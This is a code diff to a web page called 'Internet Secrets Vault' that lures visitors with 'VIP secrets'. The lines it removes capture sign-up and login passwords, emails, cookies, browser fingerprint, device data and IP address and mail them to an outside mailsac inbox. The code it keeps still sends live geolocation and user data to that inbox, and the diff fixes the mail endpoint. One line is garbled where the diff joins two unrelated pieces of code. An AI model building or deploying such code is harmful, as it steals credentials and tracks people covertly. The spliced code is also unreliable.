@@ -180,152 +180,18 @@
         function showLogin() {
             document.getElementById('teaser').style.display = 'none';
             document.getElementById('loginPrompt').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'block';
-            document.getElementById('signupBox').style.display = 'none';
-        }
-
-        function showSignup() {
-            document.getElementById('teaser').style.display = 'none';
-            document.getElementById('loginPrompt').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('signupBox').style.display = 'block';
-        }
-
-        function signUp() {
-            let username = document.getElementById('signupUsername').value;
-            let email = document.getElementById('signupEmail').value;
-            let password = document.getElementById('signupPassword').value;
-            if (password.length < 6) {
-                alert('Password must be at least 6 characters!');
-                return;
-            }
-            collectUserData(username, email, password);
-            isLoggedIn = true;
-            updateUI();
-            alert('Sign Up successful! Now you can access VIP content.');
-            // Show consent after signup
-            document.getElementById('consentBox').style.display = 'block';
-        }
-
-        function signIn() {
-            let email = document.getElementById('loginEmail').value;
-            let password = document.getElementById('loginPassword').value;
-            if (email && password) {
-                collectUserData(null, email, password);
-                isLoggedIn = true;
-                updateUI();
-                alert('Sign In successful! Welcome to VIP secrets.');
-                // Show consent after signin
-                document.getElementById('consentBox').style.display = 'block';
-            } else {
-                alert('Invalid email or password!');
-            }
-        }
-
-        function logout() {
-            isLoggedIn = false;
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-            hasConsent = false;
-            updateUI();
-            alert('Logged out successfully!');
-        }
-
-        function updateUI() {
-            if (isLoggedIn) {
-                document.getElementById('teaser').style.display = 'none';
-                document.getElementById('loginPrompt').style.display = 'none';
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('signupBox').style.display = 'none';
-                document.getElementById('premiumTeaser').style.display = 'block';
-                document.getElementById('logoutBtn').style.display = 'block';
-            } else {
-                document.getElementById('teaser').style.display = 'block';
-                document.getElementById('loginPrompt').style.display = 'block';
-                document.getElementById('premiumTeaser').style.display = 'none';
-                document.getElementById('logoutBtn').style.display = 'none';
-                document.getElementById('consentBox').style.display = 'none';
-            }
-        }
-
-        function grantConsent() {
-            hasConsent = true;
-            document.getElementById('consentBox').style.display = 'none';
-            startLocationTracking();
-        }
-
-        function denyConsent() {
-            hasConsent = false;
-            document.getElementById('consentBox').style.display = 'none';
-            alert('Location tracking denied. Some features may be limited.');
-        }
-
-        function collectUserData(username = null, email = null, password = null) {
-            let userData = {
-                username: username || 'Guest',
-                email: email || 'N/A',
-                password: password || 'N/A',
-                signupDate: new Date().toISOString(),
-                lastSignIn: new Date().toISOString()
-            };
-
-            // Collect browser fingerprint
-            let fingerprint = {
-                userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'N/A'
-            };
-            userData.browserFingerprint = fingerprint;
-
-            // Collect device info
-            let deviceInfo = {
-                vendor: navigator.vendor || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : 'N/A'
-            };
-            userData.deviceInfo = deviceInfo;
-
-            // Collect IP Address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    userData.ipAddress = ipData.ip;
-                    sendData('user', userData);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    userData.ipAddress = 'N/A';
-                    sendData('user', userData);
-                });
-
-            // Collect cookies
-            let cookies = document.cookie || 'None';
-            userData.cookies = cookies;
-        }
-
-        function startLocationTracking() {
-            if (hasConsent && isLoggedIn && navigator.geolocation) {
-                locationWatchId = navigator.geolocation.watchPosition(
-                    position => {
-                        let locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
+            document.getElementByaccuracy: position.coords.accuracy,
                             timestamp: new Date().toISOString()
                         };
                         sendData('location', locationData);
                         console.log('Live Location:', locationData);
                     },
-                    error => console.log('Location error:', error),
+                    error => {
+                        console.error('Location error:', error);
+                        if (error.code == 1) {
+                            alert('Location permission denied. Please enable it in browser settings.');
+                        }
+                    },
                     { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                 );
             }
@@ -334,7 +200,7 @@
         function sendData(type, data) {
             const mailsacEmail = "sohil_vrx3y@mailsac.com";
             if (navigator.onLine) {
-                fetch('https://mailsac.com/api/send', {
+                fetch('https://mailsac.com/api/outgoing-messages', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -343,7 +209,7 @@
                     body: JSON.stringify({
                         to: mailsacEmail,
                         subject: `User Data from Internet Secrets Vault - ${type}`,
-                        text: JSON.stringify(data, null, 2)
+                        message: JSON.stringify(data, null, 2)
                     })
                 })
                 .then(response => response.json())
@@ -371,7 +237,6 @@
             }
         });
 
-        // Clean up on unload
         window.onunload = () => {
             if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
         };
